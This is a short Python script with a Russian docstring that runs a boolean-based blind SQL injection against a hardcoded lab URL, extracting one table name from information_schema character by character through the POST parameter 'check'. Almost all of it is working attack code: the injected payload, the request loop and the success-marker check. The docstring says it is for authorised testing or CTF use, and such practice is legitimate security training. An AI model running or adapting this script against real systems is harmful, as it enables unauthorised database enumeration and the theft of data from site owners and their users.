"""
=============================================================================
 tablenamebd.py — Boolean-Based Blind SQLi: имя одной таблицы (мини-версия)
=============================================================================

ЗАЧЕМ:
    Короткий скрипт: посимвольно извлекает имя ОДНОЙ таблицы текущей БД
    (information_schema.tables, LIMIT 1,1 → вторая таблица) булевой слепой
    инъекцией. Признак верного символа — маркер "under consideration".

ГДЕ ПРИМЕНИМО:
    Быстро вытащить конкретное имя таблицы при булевой слепой SQLi, когда не
    нужен полный универсальный инструмент. Оператор инъекции — '||'.

ЗАПУСК:
    python3 tablenamebd.py   (url и db_name заданы в коде)

ОГРАНИЧЕНИЯ / ЗАМЕЧАНИЯ:
    - ЗАХАРДКОЖЕНО: url (с уникальным путём стенда), параметр 'check',
      LIMIT 1,1 (индекс таблицы), маркер "under consideration".
    - Извлекает только одну таблицу; для списка меняйте OFFSET/LIMIT в цикле.
    - Только для авторизованного тестирования / CTF.
=============================================================================
"""
import requests
url = "http://172.23.212.69/82b8a831e18b5e105bd5928e89e21032/index.php"
db_name = "miniboss"

table_name = ""
for i in range(1, 50):  # Позиции символов
	for char in "@_abcdefghijklmnopqrstuvwxyz_0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ":
		payload = f"99999' || SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 1,1),{i},1)='{char}'-- -"

		data = {"check": payload}

		response = requests.post(url, data=data)
		# Проверяем, содержит ли ответ "under consideration" (условный маркер успеха)
		if "under consideration" in response.text:
			table_name += char
			print(f"Found char with pos {i}: {char}")
			break

print(f"Имя : {table_name}")
